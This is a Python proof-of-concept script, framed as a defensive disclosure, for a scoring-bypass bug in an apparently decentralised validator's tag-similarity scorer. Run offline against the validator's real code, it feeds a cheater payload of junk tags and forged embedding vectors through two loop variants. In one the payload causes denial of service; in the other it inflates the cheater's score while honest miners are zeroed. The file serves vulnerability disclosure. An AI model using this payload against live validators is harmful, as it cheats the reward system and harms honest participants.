#!/usr/bin/env python3
"""
E1 scoring-bypass -- LOCAL, OFFLINE proof-of-concept (defensive disclosure).

Runs entirely in-process against this repo's REAL validator scoring code
(GroundTruthTagSimilarityScoringMechanism) and the REAL tag cleaner
(Utils.get_clean_tag_set). It NEVER touches the network, registers a hotkey, or
submits to any validator. It builds the cheater payload (cheater_miner.py) and
feeds it through BOTH validator loop variants so you can match it to YOUR code:

  VARIANT A  = validator WITHOUT a local try/except around format_results
               (afterpartyai `main`, i.e. pre-v2.37.74). The junk payload makes
               format_results raise; with no local catch it propagates to the
               top-level handler (validator.py "Top Level Validator Error") and
               evaluate() NEVER runs  -> Denial-of-Service (batch aborts).

  VARIANT B  = validator WITH try/except...continue around format_results
               (v2.37.74 / PR #135 commit 2741fa0e, mainnet 2026-08-18). The
               raise is caught, `continue` skips the rest of the iteration but
               does NOT remove the response, so evaluate() scores the forged
               vectors -> SCORE INFLATION (+ honest miners zeroed, bug D1).

Default mode is fully offline (deterministic mock embeddings) and proves the
CONTROL FLOW + trust-boundary. Pass --real (needs OPENAI_API_KEY) to reproduce
realistic magnitudes with text-embedding-3-small.

Usage:
    python reproduce.py            # offline, no key, deterministic
    python reproduce.py --real     # realistic magnitudes (needs OPENAI_API_KEY)
"""
import argparse
import asyncio
import hashlib
import os
import sys

import numpy as np

# --- real validator code under test -----------------------------------------
from conversationgenome.scoring_mechanism.GroundTruthTagSimilarityScoringMechanism import (
    GroundTruthTagSimilarityScoringMechanism as Scorer,
)
from conversationgenome.utils.Utils import Utils

from cheater_miner import honest_miner_output, cheater_miner_output, JUNK_TAGS


# --- minimal stand-ins for exactly the attributes the real scorer reads ------
class Meta:
    def __init__(self, tags, vectors):
        self.tags = tags
        self.vectors = vectors


class Inp:
    def __init__(self, meta):
        self.metadata = meta


class TB:
    def __init__(self, meta):
        self.input = Inp(meta)


class Axon:
    def __init__(self, hk):
        self.hotkey = hk
        self.uuid = "uuid-" + hk


class Dend:
    def __init__(self):
        self.status_code = 200


class Resp:
    def __init__(self, cgp, hk):
        self.cgp_output = cgp
        self.axon = Axon(hk)
        self.dendrite = Dend()


# --- embeddings: offline deterministic mock, or real text-embedding-3-small ---
# The mock is WORD-COMPOSITIONAL: each word gets a fixed pseudo-random vector and
# a tag is the normalised mean of its word vectors. Tags that share words land
# near each other, so an honest on-topic answer scores a believable non-zero
# offline (real magnitudes still need --real). Deterministic across runs.
_word_cache = {}


def _word_vec(w, dim):
    if (w, dim) not in _word_cache:
        h = hashlib.sha256(w.encode()).digest()
        rng = np.random.default_rng(int.from_bytes(h[:8], "little"))
        v = rng.standard_normal(dim).astype(np.float64)
        _word_cache[(w, dim)] = v / np.linalg.norm(v)
    return _word_cache[(w, dim)]


def mock_embed(text, dim=64):
    words = text.split() or [text]
    v = np.mean([_word_vec(w, dim) for w in words], axis=0)
    return v / np.linalg.norm(v)


def real_embed_many(texts, dim=1536):
    from openai import OpenAI
    client = OpenAI()
    r = client.embeddings.create(model="text-embedding-3-small", input=texts, dimensions=dim)
    return {t: np.asarray(d.embedding, dtype=np.float64) for t, d in zip(texts, r.data)}


# --- faithful replica of ConversationTaggingTaskBundle.format_results --------
# Uses the REAL Utils.get_clean_tag_set to decide whether it raises (offline),
# exactly as the validator's validate_tag_set does before any LLM call.
def format_results_sim(miner_result, embed_fn):
    miner_result["original_tags"] = miner_result["tags"]
    clean = Utils.get_clean_tag_set(miner_result["tags"])   # REAL cleaner
    if not clean:
        raise ValueError("tags cannot be empty.")           # exactly what the validator raises
    miner_result["tags"] = clean
    # the validator RECOMPUTES vectors here, overwriting whatever the miner sent:
    miner_result["vectors"] = {t: {"vectors": embed_fn(t)} for t in clean}
    return miner_result


async def variant_A_no_catch(responses, tb, scorer, embed_fn):
    """main / pre-v2.37.74: no local try/except -> a raise aborts the whole batch."""
    try:
        for r in responses:
            format_results_sim(r.cgp_output[0], embed_fn)   # junk payload raises here
        return await scorer.evaluate(tb, miner_responses=responses)
    except Exception as e:
        return ("ABORTED", e)


async def variant_B_catch_continue(responses, tb, scorer, embed_fn):
    """v2.37.74 / PR#135 commit 2741fa0e: try/except...continue keeps the bad response."""
    for r in responses:
        try:
            format_results_sim(r.cgp_output[0], embed_fn)
        except Exception:
            continue                                        # <-- response RETAINED in `responses`
    return await scorer.evaluate(tb, miner_responses=responses)


def score_of(result, hotkey):
    fs, rs = result
    for entry in fs:
        if entry.get("hotkey") == hotkey:
            return entry.get("final_miner_score", 0.0), entry.get("adjustedScore", 0.0)
    return None, None


async def main(use_real):
    scorer = Scorer()
    dim = 1536 if use_real else 64

    # --- build a task: 10 ground-truth tags (the validator's secret answer) ---
    gt_tags = ["mortgage rates", "housing market", "interest rates", "home buyers",
               "real estate", "property prices", "refinancing", "housing supply",
               "affordability", "rental market"]
    honest_tags = ["home loans", "house prices", "buyer demand", "mortgage lenders",
                   "housing affordability", "property investment", "loan approvals",
                   "first time buyers", "market slowdown", "rental costs"]
    guess_tags = gt_tags[:]  # attacker runs the validator's own prompt -> ~same topic

    if use_real:
        allv = real_embed_many(sorted(set(gt_tags + honest_tags + guess_tags)))
        embed_fn = lambda t: allv[t]
    else:
        embed_fn = lambda t: mock_embed(t, dim)

    gt_vecs = [embed_fn(t) for t in gt_tags]
    centroid = np.mean(gt_vecs, axis=0)
    forged = np.mean([embed_fn(t) for t in guess_tags], axis=0)   # attacker's estimate of centroid
    forged_random = mock_embed("totally unrelated junk", dim)

    meta = Meta(gt_tags, {t: {"vectors": embed_fn(t)} for t in gt_tags})
    tb = TB(meta)

    print("=" * 74)
    print("E1 SCORING-BYPASS -- LOCAL PoC (defensive; no network)   mode:",
          "REAL text-embedding-3-small" if use_real else "OFFLINE mock")
    print("=" * 74)

    print("\nFORGED CHEATER RESPONSE (cheater_miner.cheater_miner_output):")
    print(f"  tags   : {JUNK_TAGS}")
    print(f"  vectors: {{'ab': {{'vectors': <{dim} floats>}}, ... }}   # attacker-supplied")

    # prove the REAL raise site is real (offline): the validator's own function
    try:
        from conversationgenome.llm.llm_factory import get_llm_backend
        get_llm_backend().validate_tag_set(list(JUNK_TAGS))
        print("\n[raise check] validate_tag_set(junk) did NOT raise (unexpected)")
    except Exception as e:
        print(f"\n[raise check] REAL validate_tag_set(junk) raises -> {type(e).__name__}: {e}")

    # ---- VARIANT A : no local catch (main / pre-2.37.74) --------------------
    respA = [Resp(honest_miner_output(honest_tags), "hk-honest"),
             Resp(cheater_miner_output(forged), "hk-cheater")]
    outA = await variant_A_no_catch(respA, tb, scorer, embed_fn)
    print("\n--- VARIANT A: validator WITHOUT local catch (main / pre-v2.37.74) ---")
    if isinstance(outA, tuple) and outA[0] == "ABORTED":
        print(f"  format_results raised -> propagates -> evaluate() NEVER runs")
        print(f"  RESULT: DoS -- whole batch scoring aborts ({type(outA[1]).__name__}); nobody scored")
    else:
        print("  (unexpected: evaluate ran)")

    # ---- VARIANT B : catch-and-continue (v2.37.74 / PR#135) -----------------
    respB = [Resp(honest_miner_output(honest_tags), "hk-honest"),
             Resp(cheater_miner_output(forged), "hk-cheater")]
    outB = await variant_B_catch_continue(respB, tb, scorer, embed_fn)
    h_fin, h_adj = score_of(outB, "hk-honest")
    c_fin, c_adj = score_of(outB, "hk-cheater")
    print("\n--- VARIANT B: validator WITH try/except...continue (v2.37.74 / commit 2741fa0e) ---")
    print(f"  format_results raised -> caught -> continue -> forged response RETAINED")
    print(f"  evaluate() then scores the retained response:")
    print(f"    HONEST  (real work)             final = {h_fin:.4f}")
    print(f"    CHEATER (junk + forged vector)  final = {c_fin:.4f}   adj = {c_adj:.4f}")

    # extra: an un-aimed forged vector fails -> you must AIM at the centroid
    respR = [Resp(cheater_miner_output(forged_random), "hk-random")]
    outR = await variant_B_catch_continue(respR, tb, scorer, embed_fn)
    r_fin, _ = score_of(outR, "hk-random")

    # extra: D1 -- honest miner during a validator LLM outage. The validator's
    # OWN screen LLM fails, so format_results raises on the honest tags too;
    # catch/continue leaves the honest response untouched with vectors=None, and
    # evaluate() then reads None -> hard 0.0. We feed the untouched None response
    # straight to the real evaluate(), exactly as the catch-continue would.
    respD = [Resp([{"tags": honest_tags[:5], "vectors": None}], "hk-d1")]
    outD = await scorer.evaluate(tb, miner_responses=respD)
    d_fin, _ = score_of(outD, "hk-d1")

    print(f"    (forged vector aimed at centroid -> {c_fin:.4f};  un-aimed random vector -> {r_fin:.4f})")
    print(f"    (D1: honest miner with vectors=None -> {d_fin:.4f}  <- zeroed on a validator outage)")

    print("\n" + "=" * 74)
    print("VERDICT")
    print("=" * 74)
    print("  * Core trust bug (scorer reads miner-supplied 'vectors') : PRESENT on main AND v2.37.74")
    print("  * VARIANT A (no catch, current mainnet pre-upgrade)      : payload = DoS, no score gain")
    print("  * VARIANT B (catch-continue, v2.37.74 mainnet 2026-08-18): payload = SCORE INFLATION")
    print(f"      cheater final {c_fin:.4f} vs honest {h_fin:.4f}"
          + ("   (offline mock -- run --real for true ~0.85 vs ~0.55)" if not use_real else ""))
    print("  Check YOUR validator.py response loop: is format_results wrapped in")
    print("  try/except...continue? If yes -> you have VARIANT B (score inflation).")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--real", action="store_true", help="use real text-embedding-3-small (needs OPENAI_API_KEY)")
    args = ap.parse_args()
    asyncio.run(main(args.real))
